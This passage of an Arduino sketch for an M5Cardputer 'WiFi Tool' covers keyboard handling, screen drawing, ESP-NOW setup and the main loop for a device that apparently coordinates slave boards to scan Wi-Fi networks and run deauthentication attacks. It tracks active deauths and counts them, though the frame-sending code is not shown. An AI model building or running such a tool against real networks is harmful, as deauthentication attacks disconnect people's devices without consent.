  if (M5Cardputer.Keyboard.isChange()) {
    if (M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
      for (auto keyEvent : status.word) {
        if (keyEvent) {
          key = keyEvent.key;
          break;
        }
      }
    }
  }

  // Handle special keys first
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    if (currentCommand.length() > 0) {
      processCommand(currentCommand);
      currentCommand = ""; // Clear command buffer
    }
  } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
    if (currentCommand.length() > 0) {
      currentCommand.remove(currentCommand.length() - 1); // Remove last character
    }
  } else if (M5Cardputer.Keyboard.isKeyPressed(';')) { // Use ';' for up
    // Scroll up in AP list or slave list
    if (displayOffset > 0) {
      displayOffset--;
    }
  } else if (M5Cardputer.Keyboard.isKeyPressed('.')) { // Use '.' for down
    // Scroll down
    int maxScrollOffset = 0;
    if (displayMode == 0) { // APs
        maxScrollOffset = accessPoints.size() - maxDisplayLines;
    } else if (displayMode == 1) { // Slaves
        maxScrollOffset = slaves.size() - maxDisplayLines; // Assuming same maxDisplayLines
    }
    if (maxScrollOffset < 0) maxScrollOffset = 0; // Don't scroll if not enough items
    if (displayOffset < maxScrollOffset) {
      displayOffset++;
    }
  } else if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('/')) { // Use ',' for left, '/' for right
      // Cycle display modes
      displayMode = (displayMode + 1) % 3;
      displayOffset = 0; // Reset scroll on view change
      statusMessage = "Switched view to ";
      statusMessage += (displayMode == 0 ? "APs" : (displayMode == 1 ? "Slaves" : "Stats"));
  }
  else {
    // Handle alphanumeric and symbol keys
    if (key != 0 && currentCommand.length() < 30) { // Limit command length
      currentCommand += key;
    }
  }
}

// =============================================================================
// DISPLAY FUNCTIONS
// =============================================================================
void clearScreen() {
  M5Cardputer.Display.fillScreen(COLOR_BG);
}

void drawBorder() {
  // Draw outer border
  M5Cardputer.Display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, COLOR_BORDER);
  // Optional inner border for thicker look
  M5Cardputer.Display.drawRect(1, 1, SCREEN_WIDTH-2, SCREEN_HEIGHT-2, COLOR_BORDER);

  // Draw header separator
  M5Cardputer.Display.drawLine(BORDER_WIDTH, HEADER_HEIGHT,
                               SCREEN_WIDTH-BORDER_WIDTH, HEADER_HEIGHT, COLOR_BORDER);

  // Draw footer separator
  M5Cardputer.Display.drawLine(BORDER_WIDTH, SCREEN_HEIGHT-FOOTER_HEIGHT,
                               SCREEN_WIDTH-BORDER_WIDTH, SCREEN_HEIGHT-FOOTER_HEIGHT, COLOR_BORDER);
}

void drawHeader() {
  M5Cardputer.Display.setTextColor(COLOR_HEADER);
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setFont(&fonts::Font0); // Use a standard small font

  // Title and slave count
  M5Cardputer.Display.setCursor(5, 5);
  M5Cardputer.Display.printf("WiFi Tool - Slaves:%d", getConnectedSlaveCount());

  // Status indicator
  M5Cardputer.Display.setCursor(150, 5); // Position status towards right
  if (scanInProgress) {
    M5Cardputer.Display.setTextColor(COLOR_WARNING);
    M5Cardputer.Display.print("SCANNING");
  } else if (deauthInProgress) {
    M5Cardputer.Display.setTextColor(COLOR_ERROR);
    M5Cardputer.Display.print("DEAUTH");
  } else {
    M5Cardputer.Display.setTextColor(COLOR_SUCCESS);
    M5Cardputer.Display.print("READY");
  }

  // Mode indicator
  M5Cardputer.Display.setTextColor(COLOR_HEADER);
  M5Cardputer.Display.setCursor(5, HEADER_HEIGHT - LINE_HEIGHT + 3); // Position below title, above separator
  String mode = "";
  if (displayMode == 0) mode = "APs";
  else if (displayMode == 1) mode = "SLAVES";
  else if (displayMode == 2) mode = "STATS";
  M5Cardputer.Display.printf("Mode:%s APs:%d", mode.c_str(), accessPoints.size());
}

void drawAccessPoints() {
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setFont(&fonts::Font0);
  int y = HEADER_HEIGHT + 5;
  int lineCount = 0;
  // Calculate max displayable lines dynamically
  maxDisplayLines = (SCREEN_HEIGHT - HEADER_HEIGHT - FOOTER_HEIGHT - 10) / LINE_HEIGHT;

  if (accessPoints.empty()) {
    M5Cardputer.Display.setTextColor(COLOR_TEXT);
    M5Cardputer.Display.setCursor(5, y);
    M5Cardputer.Display.print("No networks found. Type 'scan'");
    return;
  }

  // Ensure displayOffset doesn't go out of bounds
  if (displayOffset > 0 && displayOffset >= accessPoints.size()) {
      displayOffset = (accessPoints.size() > maxDisplayLines) ? accessPoints.size() - maxDisplayLines : 0;
  }


  int displayEnd = min((int)accessPoints.size(), displayOffset + maxDisplayLines);

  for (int i = displayOffset; i < displayEnd && lineCount < maxDisplayLines; i++) {
    int currentY = y + (lineCount * LINE_HEIGHT);

    // Selection indicator
    if (i == selectedAP) {
      M5Cardputer.Display.fillRect(3, currentY - 1, SCREEN_WIDTH - 6, LINE_HEIGHT + 1, COLOR_SELECTED);
      M5Cardputer.Display.setTextColor(COLOR_BG); // Black text on selected background
    } else {
      M5Cardputer.Display.setTextColor(COLOR_TEXT); // White text for unselected
    }

    M5Cardputer.Display.setCursor(5, currentY);

    // Format: [NUM] SSID (BAND) RSSI ENC SLAVEID
    String ssid = accessPoints[i].ssid;
    if (ssid.length() == 0) ssid = "[Hidden]";
    if (ssid.length() > 12) ssid = ssid.substring(0, 12) + ".."; // Truncate long SSIDs

    String band = accessPoints[i].is5GHz ? "5G" : "2G";
    String enc = getEncryptionType(accessPoints[i].encryption);
    String slave = accessPoints[i].slaveId; // Last 6 digits or "MASTER"

    // Print formatted AP info
    // %-14s for SSID ensures consistent width, padding with spaces if shorter
    M5Cardputer.Display.printf("%2d %-14s %2s %4d %-4s %s",
                               i + 1, ssid.c_str(), band.c_str(),
                               accessPoints[i].rssi, enc.c_str(), slave.c_str());

    lineCount++;
  }

  // Scroll indicators
  M5Cardputer.Display.setTextColor(COLOR_WARNING);
  if (displayOffset > 0) {
    M5Cardputer.Display.setCursor(SCREEN_WIDTH - 15, HEADER_HEIGHT + 5);
    M5Cardputer.Display.print("^");
  }
  if (displayOffset + maxDisplayLines < accessPoints.size()) {
    M5Cardputer.Display.setCursor(SCREEN_WIDTH - 15, SCREEN_HEIGHT - FOOTER_HEIGHT - 15);
    M5Cardputer.Display.print("v");
  }
}

void drawSlaves() {
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setFont(&fonts::Font0);
  int y = HEADER_HEIGHT + 5;
  maxDisplayLines = (SCREEN_HEIGHT - HEADER_HEIGHT - FOOTER_HEIGHT - 10) / LINE_HEIGHT;
  int lineCount = 0;

  if (slaves.empty()) {
    M5Cardputer.Display.setTextColor(COLOR_TEXT);
    M5Cardputer.Display.setCursor(5, y);
    M5Cardputer.Display.print("No slaves connected.");
    return;
  }

  // Ensure displayOffset doesn't go out of bounds for slaves view
  if (displayOffset > 0 && displayOffset >= slaves.size()) {
      displayOffset = (slaves.size() > maxDisplayLines) ? slaves.size() - maxDisplayLines : 0;
  }

  int displayEnd = min((int)slaves.size(), displayOffset + maxDisplayLines);

  for (int i = displayOffset; i < displayEnd && lineCount < maxDisplayLines; i++) {
    const auto& slave = slaves[i];
    int currentY = y + (lineCount * LINE_HEIGHT);

    M5Cardputer.Display.setTextColor(slave.connected ? COLOR_SUCCESS : COLOR_ERROR);
    M5Cardputer.Display.setCursor(5, currentY);

    String id = slave.macStr.substring(12); // Last 6 digits of MAC
    String caps = "";
    if (slave.supports5GHz) caps += "5G ";
    if (slave.supportsBLE) caps += "BLE "; // Add space for readability

    M5Cardputer.Display.printf("%s %s B:%3d%% H:%5dK U:%s T:%.1fC RX:%d",
                               id.c_str(), caps.c_str(), slave.batteryLevel,
                               slave.freeHeap / 1024, formatUptime(slave.uptime).c_str(),
                               slave.temperature, slave.packetsProcessed);

    lineCount++;
  }

  // Scroll indicators for slaves
  M5Cardputer.Display.setTextColor(COLOR_WARNING);
  if (displayOffset > 0) {
    M5Cardputer.Display.setCursor(SCREEN_WIDTH - 15, HEADER_HEIGHT + 5);
    M5Cardputer.Display.print("^");
  }
  if (displayOffset + maxDisplayLines < slaves.size()) {
    M5Cardputer.Display.setCursor(SCREEN_WIDTH - 15, SCREEN_HEIGHT - FOOTER_HEIGHT - 15);
    M5Cardputer.Display.print("v");
  }
}

void drawStatistics() {
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setFont(&fonts::Font0);
  M5Cardputer.Display.setTextColor(COLOR_TEXT);
  int y = HEADER_HEIGHT + 5;

  stats.uptime = millis(); // Update master's uptime

  M5Cardputer.Display.setCursor(5, y);
  M5Cardputer.Display.printf("Uptime: %s", formatUptime(stats.uptime).c_str());

  M5Cardputer.Display.setCursor(5, y + LINE_HEIGHT);
  M5Cardputer.Display.printf("Packets RX: %d TX: %d", stats.totalPacketsReceived, stats.totalPacketsSent);

  M5Cardputer.Display.setCursor(5, y + 2 * LINE_HEIGHT);
  M5Cardputer.Display.printf("Mesh Errors: %d", stats.meshErrors);

  M5Cardputer.Display.setCursor(5, y + 3 * LINE_HEIGHT);
  M5Cardputer.Display.printf("Scans Started: %d", stats.scanCount);

  M5Cardputer.Display.setCursor(5, y + 4 * LINE_HEIGHT);
  M5Cardputer.Display.printf("Networks Found: %d (Unique: %d)", stats.networksFound, stats.uniqueNetworks);

  M5Cardputer.Display.setCursor(5, y + 5 * LINE_HEIGHT);
  M5Cardputer.Display.printf("Deauths Initiated: %d", stats.deauthCount);

  M5Cardputer.Display.setCursor(5, y + 6 * LINE_HEIGHT);
  M5Cardputer.Display.printf("Active Deauths: %d", std::count_if(deauthTargets.begin(), deauthTargets.end(), [](const DeauthTarget& t){ return t.active; }));

  M5Cardputer.Display.setCursor(5, y + 7 * LINE_HEIGHT);
  M5Cardputer.Display.printf("Connected Slaves: %d", getConnectedSlaveCount());
}

void drawFooter() {
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setFont(&fonts::Font0);

  // Clear the footer area before drawing new content
  M5Cardputer.Display.fillRect(BORDER_WIDTH, SCREEN_HEIGHT - FOOTER_HEIGHT + BORDER_WIDTH,
                               SCREEN_WIDTH - 2*BORDER_WIDTH, FOOTER_HEIGHT - 2*BORDER_WIDTH, COLOR_BG);

  M5Cardputer.Display.setTextColor(COLOR_TEXT);
  M5Cardputer.Display.setCursor(5, SCREEN_HEIGHT - FOOTER_HEIGHT + 3); // Position above command line
  M5Cardputer.Display.print("Status: " + statusMessage);

  M5Cardputer.Display.setCursor(5, SCREEN_HEIGHT - FOOTER_HEIGHT + 13); // Command line position
  M5Cardputer.Display.printf("> %s_", currentCommand.c_str()); // Add underscore cursor
}

void updateDisplay() {
  // Clear only the content area to avoid flickering the border/header/footer
  M5Cardputer.Display.fillRect(BORDER_WIDTH, HEADER_HEIGHT + BORDER_WIDTH,
                               SCREEN_WIDTH - 2*BORDER_WIDTH, SCREEN_HEIGHT - HEADER_HEIGHT - FOOTER_HEIGHT - 2*BORDER_WIDTH, COLOR_BG);

  drawHeader();

  // Draw content based on display mode
  if (displayMode == 0) {
    drawAccessPoints();
  } else if (displayMode == 1) {
    drawSlaves();
  } else { // displayMode == 2
    drawStatistics();
  }

  drawFooter();
}


// =============================================================================
// ARDUINO SETUP AND LOOP FUNCTIONS
// =============================================================================
void setup() {
  // Initialize M5Cardputer
  M5Cardputer.begin();
  M5Cardputer.Display.setRotation(0); // Adjust display rotation if needed
  M5Cardputer.Display.setBrightness(100); // Set brightness

  clearScreen();
  drawBorder();
  drawHeader();
  drawFooter();
  statusMessage = "Initializing WiFi...";
  updateDisplay();

  // Initialize WiFi in Station mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true); // Disconnect from any previous AP and clear credentials

  // Initialize ESP-NOW
  if (esp_now_init() != ESP_OK) {
    statusMessage = "ESP-NOW init failed!";
    updateDisplay();
    while(1) delay(1000); // Halt on critical failure
  }

  // Register callbacks for ESP-NOW
  esp_now_register_recv_cb(onESPNowDataReceived);
  esp_now_register_send_cb(onESPNowDataSent);

  // Set WiFi channel for ESP-NOW
  esp_wifi_set_channel(MESH_CHANNEL, WIFI_SECOND_CHAN_NONE);

  // Initialize peer info structure
  esp_now_peer_info_t peerInfo = {};
  peerInfo.channel = MESH_CHANNEL;
  peerInfo.encrypt = false;
  
  // Load any previously known slaves and add them as peers
  for (const auto& slave : slaves) {
    memcpy(peerInfo.peer_addr, slave.mac, 6);
    esp_err_t res = esp_now_add_peer(&peerInfo);
    if (res != ESP_OK) {
      String macStr = macToString(slave.mac);
      statusMessage = "Failed to add peer: " + macStr + " Err: " + String(res);
      updateDisplay();
    }
  }
  
  statusMessage = "ESP-NOW Initialized! Channel " + String(MESH_CHANNEL);
  updateDisplay();

  statusMessage = "System Ready. Type 'help'.";
  updateDisplay();
}

void loop() {
  M5Cardputer.update(); // Update M5Cardputer internal states (keyboard, power, etc.)

  handleKeyboardInput(); // Process user input from keyboard

  // Periodically check slave connections and send heartbeats
  checkSlaveConnections();
  sendHeartbeat();

  // Check the progress of any ongoing WiFi scans
  checkScanProgress();

  // Check the progress of any ongoing deauthentication operations
  checkDeauthProgress();

  // Update the display at a reasonable rate to avoid flickering and save power
  // Only update if enough time has passed or if there's a significant change
  if (millis() - lastStatusUpdate > 100 || !M5Cardputer.Keyboard.keyList().empty()) {
    updateDisplay();
    lastStatusUpdate = millis();
  }

  // Small delay to prevent busy-waiting and allow other tasks (like WiFi/ESP-NOW) to run
  delay(10);
}
